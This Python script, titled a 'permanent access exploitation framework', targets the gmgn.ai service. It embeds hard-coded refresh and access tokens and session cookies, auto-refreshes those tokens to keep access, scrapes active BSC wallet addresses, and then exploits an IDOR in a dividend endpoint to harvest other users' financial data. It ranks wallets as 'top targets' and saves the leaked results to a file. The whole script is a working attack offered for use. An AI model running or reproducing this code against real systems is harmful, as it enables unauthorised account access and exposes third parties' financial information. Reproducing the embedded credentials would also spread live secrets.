#!/usr/bin/env python3
"""PERMANENT ACCESS FRAMEWORK - Auto-refresh tokens, exploit indefinitely."""
import json
import requests
import time
from datetime import datetime, timedelta

# Store tokens here
REFRESH_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiI4YTRjM2Q2My04OGZhLTQ2Y2MtOTg0YS1lODg1ZDRhZmQxYjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxMC0xOTcyLTlmNDljOGYiLCJkZXZpY2VfaWQiOiJhY2Y4OThjNy01MDYzLTRkMGYtYjk5Mi1kMWU1ZDU2ODQwOWUiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxZjE2MDg1ODljZmQ1N2I5NTA0MzQ1YWE4MmRjZWE0MTIiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2MzI1ODI5LCJpYXQiOjE3ODM3MzM4MjksImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiZTNkODVmNTktYzEwNS00MDQzLWEwNjAtOWE2ZjEwZTc5ZWY3IiwibmJmIjoxNzgzNzMzODI5LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiOGE0YzNkNjMtODhmYS00NmNjLTk4NGEtZTg4NWQ0YWZkMWI1IiwidmVyIjoiMS4wIn0.T-souQasgFY_CMVReqltxNdrYqa0qPOozLdbvc95nO7WgrAyn-bNhBXayi50IRvYG2kX5kmd3-wHEwY8jSqWag"

# NEW access token from refresh response
ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjhhNGMzZDYzLTg4ZmEtNDZjYy05ODRhLWU4ODVkNGFmZDFiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzEwLTE5NzItOWY0OWM4ZiIsImRldmljZV9pZCI6ImFjZjg5OGM3LTUwNjMtNGQwZi1iOTkyLWQxZTVkNTY4NDA5ZSIsImZhdGhlcl9pZCI6ImUzZDg1ZjU5LWMxMDUtNDA0My1hMDYwLTlhNmYxMGU3OWVmNyIsImZpbmdlcnByaW50IjoidjFmMTYwODU4OWNmZDU3Yjk1MDQzNDVhYTgyZGNlYTQxMiIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODM4NzExNzQsImlhdCI6MTc4Mzg2OTM3NCwiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiIyY2U4ZGUxYy1kNmIzLTQ4NDQtOWEwZS00NTRmYTU3YmZlOWIiLCJuYmYiOjE3ODM4NjkzNzQsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjhhNGMzZDYzLTg4ZmEtNDZjYy05ODRhLWU4ODVkNGFmZDFiNSIsInZlciI6IjEuMCJ9._L3vlOktOBNkkkbsDkb2vpoxjCqCAZ6jT2l_pVD0T_TjrvOXBEykZRZhzOAxY7fhr-ygabdgKIjRK4A4lmRceQ"

COOKIES = {
    "_ga_UGLVBMV4Z0": "GS1.2.1783868828922928.d557456dab82a63259179cf5603c7cb8.2et19uuic9LyMBph5Cx3hQ%3D%3D.mIlh9tL7rCIb2reoLkDLSA%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.V7iy1IQ16P92AotWIN9BjQ%3D%3D",
    "__cf_bm": "j_lS0Oscc4a0_D5Yn.nzhtaJpsJLgahl.qF9h1fJUuA-1783868831.6090767-1.0.1.1-iGgjPq_FDdPkkmhVdjThsxiacp4AYJCX5UtvDc4_w0LLXNqxGSlKq9EikgRmFAJSDr9Wc1NcKC1YhLPmejETCneXHyynzrMdC25Wbfm2NgnaqgV.M_rPFnN.poiDuvkC",
    "g_state": '{"i_l":1,"i_ll":1783733815177,"i_e":{"enable_itp_optimization":24},"i_et":1783733815177}',
    "_ga_0XM0LYXGC8": "GS2.1.s1783865236$o25$g1$t1783868849$j39$l0$h0",
    "_ga": "GA1.1.1499118900.1783283677",
    "_csrf": "zp-fQVg4uAYlEsx7cronE5kO3GM4xIln",
    "_did": "c800ab0b7d01aa37bc93aacdcbce271e",
    "_wt": "AWpa2MXrjj0uvG6i4MZw3ZLOqVnU803QqMIf1eo",
    "sid": "gmgn|df83ac2f9a7e02144cb10ded0c21ad5c",
}

PARAMS = {
    "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260712-1986-3641f8b",
    "from_app": "gmgn",
    "app_ver": "20260712-1986-3641f8b",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0"
}

def get_headers(token):
    return {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Origin": "https://gmgn.ai",
        "Referer": "https://gmgn.ai/",
    }

def refresh_access_token():
    """Get fresh access token using refresh token."""
    global ACCESS_TOKEN
    
    print(f"[{datetime.now()}] 🔄 Refreshing access token...")
    
    try:
        r = requests.post(
            "https://gmgn.ai/account/account/refresh_access_token",
            params=PARAMS,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            cookies=COOKIES,
            json={"refresh_token": REFRESH_TOKEN},
            timeout=15
        )
        
        if r.status_code == 200:
            d = r.json()
            if d.get("code") == 0:
                new_token = d["data"]["data"]["token"]
                ACCESS_TOKEN = new_token
                print(f"✅ Got new access token (expires: {d['data']['data']['expire_at']})")
                print(f"   Token: {new_token[:50]}...")
                return ACCESS_TOKEN
        
        print(f"❌ Refresh failed: {r.text[:200]}")
        return None
        
    except Exception as e:
        print(f"❌ Exception: {e}")
        return None


def exploit_dividend_disclosure(wallets):
    """Read dividend data for list of wallets (IDOR)."""
    print(f"\n💀 EXPLOITING F2: Dividend Info Disclosure")
    print(f"   Targeting {len(wallets)} wallets...")
    
    leaked = []
    for i, w in enumerate(wallets, 1):
        try:
            r = requests.post(
                "https://gmgn.ai/xapi/v1/bsc/flap/dividend_info",
                headers=get_headers(ACCESS_TOKEN),
                cookies=COOKIES,
                json={"from_address": w},
                timeout=10
            )
            
            if r.status_code == 200:
                d = r.json()
                if d.get("code") == 0:
                    usdt = float(d.get("data", {}).get("total_usdt_value", "0"))
                    if usdt > 0:
                        print(f"   [{i:3d}] {w}: ${usdt:.2f} 💰")
                        leaked.append({"wallet": w, "usdt": usdt, "data": d["data"]})
                        
        except:
            pass
    
    return leaked


def scrape_active_wallets(limit=100):
    """Scrape active BSC wallets from public rankings."""
    print(f"\n🎯 Scraping top {limit} BSC wallets...")
    
    try:
        r = requests.get(
            f"https://gmgn.ai/defi/quotation/v1/rank/bsc/swaps/24h?orderby=swaps&direction=desc&limit={limit}",
            headers=get_headers(ACCESS_TOKEN),
            cookies=COOKIES,
            timeout=15
        )
        
        if r.status_code == 200:
            d = r.json()
            if d.get("data", {}).get("rank"):
                wallets = [w["address"] for w in d["data"]["rank"]]
                print(f"✅ Scraped {len(wallets)} wallets")
                return wallets
                
    except Exception as e:
        print(f"❌ Scraping failed: {e}")
    
    return []


def main():
    print("="*80)
    print("🔥 PERMANENT ACCESS EXPLOITATION FRAMEWORK")
    print("="*80)
    print(f"Started: {datetime.now()}")
    print(f"Refresh token valid until: 2026-08-10 (30 days)")
    
    # Step 1: Ensure we have valid access token
    if not ACCESS_TOKEN or "expired" in ACCESS_TOKEN:
        print("\n[*] No valid access token, refreshing...")
        if not refresh_access_token():
            print("❌ FAILED - Can't get access token")
            return
    
    # Step 2: Scrape target wallets
    wallets = scrape_active_wallets(50)
    
    if not wallets:
        print("❌ No wallets scraped")
        return
    
    # Step 3: Exploit IDOR on all wallets
    leaked = exploit_dividend_disclosure(wallets)
    
    # Step 4: Summary
    print("\n" + "="*80)
    print("📊 EXPLOITATION SUMMARY")
    print("="*80)
    print(f"Wallets scraped: {len(wallets)}")
    print(f"Wallets with funds: {len(leaked)}")
    
    if leaked:
        total = sum(l["usdt"] for l in leaked)
        print(f"Total USDT exposed: ${total:.2f}")
        print(f"\nTop targets:")
        for item in sorted(leaked, key=lambda x: x["usdt"], reverse=True)[:10]:
            print(f"  ${item['usdt']:>10.2f} - {item['wallet']}")
    
    # Save results
    with open("/projects/sandbox/Str8Gold/leaked_dividends.json", "w") as f:
        json.dump({
            "timestamp": str(datetime.now()),
            "leaked_wallets": leaked,
            "total_usdt": sum(l["usdt"] for l in leaked) if leaked else 0
        }, f, indent=2)
    
    print(f"\n✅ Results saved to leaked_dividends.json")
    print("\n" + "="*80)
    print("DONE")
    print("="*80)


if __name__ == "__main__":
    main()
